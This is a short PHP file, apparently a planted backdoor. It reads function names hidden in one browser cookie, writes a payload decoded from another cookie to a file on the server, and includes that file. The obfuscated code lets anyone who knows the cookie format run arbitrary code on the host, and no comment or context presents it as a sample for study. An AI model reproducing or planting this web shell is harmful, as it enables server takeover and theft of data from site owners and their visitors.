<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[15])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 2;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[15][$n];
        if (!$c[15][$n + 1]) {
            if (!$c[15][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 2 + 1;
    }
    $k = $p[10]() . $p[1];
    if (!$p[0]($k)) {
        $n = $p[18]($k, $p[21]);
        $p[11]($n, $p[23] . $p[19]($p[12]($c[3])));
    }
    include($k);
}